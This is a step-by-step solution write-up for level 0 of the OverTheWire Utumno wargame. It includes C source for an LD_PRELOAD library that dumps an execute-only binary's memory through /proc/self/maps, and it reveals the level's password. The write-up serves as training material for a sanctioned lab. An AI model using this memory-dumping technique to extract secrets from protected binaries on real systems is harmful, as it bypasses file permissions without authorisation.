# OverTheWire — Utumno Level 0 Solution (utumno0 → utumno1)

> Goal: Get utumno1 user's password from `utumno0`.

---

## 1. Connection

```bash
ssh utumno0@utumno.labs.overthewire.org -p 2227
# password: utumno0
```

Server info (from login banner):
- 64-bit machine, **ASLR disabled**
- Level files in `/utumno/`
- Passwords under `/etc/utumno_pass/` (each file readable only by its user)
- Recommended to create a private directory under `/tmp` via `mktemp -d` for working files

---

## 2. Recon

### Level files
```bash
ls -la /utumno/
```
```
---x--x---  1 utumno1 utumno0 12212 utumno0          <-- our level (non-suid)
---s--x---  1 utumno1 utumno0 12212 utumno0_hard     <-- same binary, SUID utumno1
-r-sr-x---  1 utumno2 utumno1 13608 utumno1
...
```

**Critical observation:** `/utumno/utumno0` permissions are `---x--x---` →
- Owner (utumno1): only `--x`
- Group (utumno0 = us): only `--x`
- So we can **execute it but NOT READ it.**

### Password directory
```bash
ls -la /etc/utumno_pass/
```
```
-r-------- 1 utumno0 utumno0  8 utumno0
-r-------- 1 utumno1 utumno1 11 utumno1   <-- target (11 bytes = 10 chars + \n)
```

### Running the binary
```bash
/utumno/utumno0
# Output: Read me! :P
```

Input attempts — **all ignored**, always the same output:
```bash
python3 -c "print('A'*100)" | /utumno/utumno0     # Read me! :P
/utumno/utumno0 AAAAAAAAAAAAAAAA                    # Read me! :P
```

The hint (`Read me! :P`) is literal: **"Read me."** The exploit is not via input;
we need to read the binary itself.

---

## 3. What does the binary do? — strace

```bash
strace -f /utumno/utumno0
```
Key lines:
```
[ Process PID=22 runs in 32 bit mode. ]     <-- 32-bit binary
...
getrandom(...)                              <-- stack canary / rng
write(1, 0x804c1a0, 12Read me! :P) = 12     <-- writes only 12 bytes
exit_group(0)
```

Result: The binary **reads no input**, opens no extra files (only libc), just writes
`Read me! :P` and exits. So the solution = reading the contents of an execute-only file.

---

## 4. Problem: How Do We Read the File?

All normal methods fail because they try to **open (read)** the file:
```bash
cat /utumno/utumno0           # Permission denied
strings /utumno/utumno0       # Permission denied
objdump -d /utumno/utumno0    # Permission denied
gdb /utumno/utumno0           # "/utumno/utumno0: Permission denied."
```

### Key Insight 💡
When a binary **runs**, the kernel `mmap`s it into memory as `PROT_READ` (readable) segments.
`utumno0` is non-suid, so when it runs it becomes **our own process** → we have permission
to read the process's memory.

We can inject our own shared library into this process via `LD_PRELOAD`, and before `main`
runs (in the constructor), dump the binary's memory regions from `/proc/self/maps` to disk.

> Note: `LD_PRELOAD` only works on **non-suid** binaries (ignored for suid for security reasons).
> Since `utumno0` is non-suid, this is ideal.

---

## 5. Exploit — LD_PRELOAD Memory Dumper

### Working directory
```bash
W=$(mktemp -d); cd $W
```

### Dumper source (`d.c`)
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

__attribute__((constructor)) void go(void){
  FILE *m = fopen("/proc/self/maps","r");
  if(!m){ perror("maps"); _exit(1); }
  char line[1024];
  int i = 0;
  while(fgets(line, sizeof line, m)){
    if(strstr(line, "utumno0")){            // segments belonging to the binary
      unsigned long s=0, e=0; char perms[8]={0};
      sscanf(line, "%lx-%lx %7s", &s, &e, perms);
      char fn[128];
      snprintf(fn, sizeof fn, "reg_%02d_%lx_%s", i++, s, perms);
      FILE *o = fopen(fn, "wb");
      if(o){ fwrite((void*)s, 1, e-s, o); fclose(o); }
    }
  }
  fclose(m);
  _exit(0);
}
```

### Compile (32-bit — required to match the target binary)
```bash
gcc -m32 -shared -fPIC -o d.so d.c
```

### Run with injection
```bash
LD_PRELOAD=$W/d.so /utumno/utumno0
```
Dumped regions:
```
reg_00_8048000_r--p   (ELF header / .rodata start)
reg_01_8049000_r-xp   (.text — code)
reg_02_804a000_r--p   (.rodata)
reg_03_804b000_rw-p   (.data / .got / .bss)
```

---

## 6. Extract the Password

```bash
strings -n 4 reg_*
```
Among the embedded strings:
```
puts
password: .......          <-- PASSWORD IS HERE
Read me! :P
...
/root/otw-games/game-utumno/levels/utumno0
utumno0.c
puts@GLIBC_2.0
```

The binary's `.rodata` contains the embedded string `password: ytvWa6DzmL`. The program
doesn't print it during normal execution (it's behind a condition), but by reading the
binary from memory, we can see it directly.

---

## Summary / Lessons Learned

| Topic | Note |
|-------|------|
| **File permissions** | `--x` = execute but no read; static analysis tools (cat/strings/gdb) try to open the file → fail |
| **Reading an execute-only file** | When a binary runs, its segments are mapped as readable; we can dump from process memory |
| **LD_PRELOAD** | Clean way to inject code into a non-suid process; doesn't work on suid |
| **`/proc/self/maps`** | The process's own memory map; we read segment addresses and `fwrite` them to disk |
| **`-m32`** | The LD_PRELOAD library's architecture must match the target binary (32-bit) |
